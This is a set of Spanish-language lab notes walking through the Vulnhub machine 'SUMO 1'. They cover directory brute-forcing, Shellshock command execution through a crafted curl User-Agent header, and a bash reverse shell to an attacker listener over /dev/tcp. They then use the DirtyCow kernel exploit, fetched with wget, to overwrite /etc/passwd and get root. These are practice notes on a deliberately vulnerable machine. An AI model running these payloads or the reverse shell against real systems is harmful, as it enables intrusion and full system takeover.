

Material de ayuda:
Vulnhub
SUMO 1

Se puede explotar Kernel debido a su version antigua




Nos bajamos el OVA de Vulnhub y ejecutamos la maquina

Primero que nada hacemos un escaneo arp para hayas la ip a explotar
arp-scan -I ens33 --localnet --ingoredups 

La informacion que poseemos es que tiene un servidor http en elpuerto 80
y de primeras tendremos que explotar un shellshock

192.168.0.222
![[Pasted image 20250421094126.png]]

Haremos un descubrimiento de rutas con gobuster

`gobuster dir -u http://192.168.0.222/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 --add-slash`


***Encontramos un /cgi-bin/***

Volveremos a hacer un escaneo con gobuster para encontrar dentrp de la ruta cgi-bin

`gobuster dir -u http://192.168.0.222/cgi-bin/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x sh,pl,cgi`

***Encontramos/test.sh

Nos metemos al explorador y buscamos /cgi-bin/test.sh

![[Pasted image 20250421094840.png]]

Nos apoyamos buscando en el explorador
How Attackers are using it shellshock de cloudfare

Recordemos:
La explotacion era por medio del metodo get

curl -s -X GET "http://192.168.0.222/cgi-bin/test.sh" -H "User-Agent:   () { :; }; /usr/bin/whoami"

En caso de no ver en el output la respuesta del servidor hacemos lo siguiente:
Agregamos un echo; antes del comando a ejecutar
`root@parrot /home/ken $ curl -s -X GET "http://192.168.0.222/cgi-bin/test.sh" -H "User-Agent: () { :; }; echo; /usr/bin/whoami"`
`www-data`
`root@parrot /home/ken

Ahora viendo que tenemos ejecucion de comandos hacemos lo siguiente (asi ejecutamos una shell de manera remota):

 curl -s -X GET "http://192.168.0.222/cgi-bin/test.sh" -H "User-Agent: () { :; }; echo; /bin/bash -i >& /dev/tcp/192.168.0.62/443 0>&1"
 
 Ademas :
 Nos ponemos en escucha con netcat 
 nc -nlvp 443
 si no recibimos conexion utilizamos 
 iptables -I INPUT -j ACCEPT
  y ejecutamos netcat
  Resultado:
  `
![[Pasted image 20250421100607.png]]

Hacemos tratamiento TTI

Una vez hecho

lsb_release -a (lo usamos para ver la version de ubuntu)
uname -a (para ver version kernel)

![[Pasted image 20250421111127.png]]

Como podemos observar tenemos version de kernel 3.2

Buscamos con la herramienta searchsploit para ver las vulnerabilidades de esa version de kernel
`searchsploit Kernel 3.2`

Nos apareceran varias veces DirtyCow(scrripts en C)
CVE-2016-5195
Indagando mas nos aparecera una vulnerabilidad llamada Race Condition

`searchsploit Dirty cow

Vamos a utilizar la vulnerabilidad que altera el /etc/passwd

```
searchsploit dirty cow /etc/passwd
```

![[Pasted image 20250421113205.png]]

Utilizaremos ptrace_pokedata

`searchsploit -x linux/local40839.c


which gcc
(Nos moveremos el script de searchsploit a la maquina victima)
searchsploit -m /linux/local/40839.c

lo bajamos y levantamos un servidor en python para bajarlo en la maquina victima
Nos vamos al /tmp/ (en la maquina victima)
Para bajarlo hacemos wget (IP-ATACANTE)/40839.c



Muchas veces esos script te dicen en el codigo lo que se debe de hacer

`cat 40839.c | grep gcc`


``www-data@ubuntu:/tmp$ cat dirtycow.c | grep gcc``
``//   gcc -pthread dirty.c -o dirty(este sera el nombre del binario) -lcrypt``
``www-data@ubuntu:/tmp$

 
gcc -pthread dirtycow.c -o dirty -lcrypt

OJO:
Si presentas problema donde no te permite utilizar el comando anterior prueba ejecutando esto
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

y luego ejecuta :
		gcc -pthread dirtycow.c -o dirty -lcrypt
Asi se ha creado el binario para modificar el /etc/passwd


![[Pasted image 20250421122005.png]]

Altera y retoca el etc/passwd para crear un usuario y contraseña hardcodeada

Lo puedes modificar en el codigo user.name

Se tiene que ejecutar el exploit y pedira ingresar la contraseña que se hardcodeara en el /etc/passwd

![[Pasted image 20250421122257.png]]


Como pdemos observar en la imagen se creo el usuario root con la contraseña hardcodead
![[Pasted image 20250421122442.png]]


Si quieres restablecer el /etc/passwd
se crea un /etc/passwd.bak  o /etc/passwd- con la configuracion original

Conclusion cuando se explote una maquina para escalar privilegios podemos  revisar la version de kernel que tiene y podemos buscar la explotacion

#TAREA
TAREA: EXPLOTAR 37292 (puedes apoyarte con la pagina vk9-sec.com)
recordemos que primero se exploto un shellshock
searchsploit 37292

HERRAMIENTA DE APOYO:
En caso de que no encuentres una vulnerabilidad hay en github
LES: Linux privilege escalation auditing tool The-X-Labs

La herramienta LES te da los CVE y los detalles acerca de la vulnerabilidad



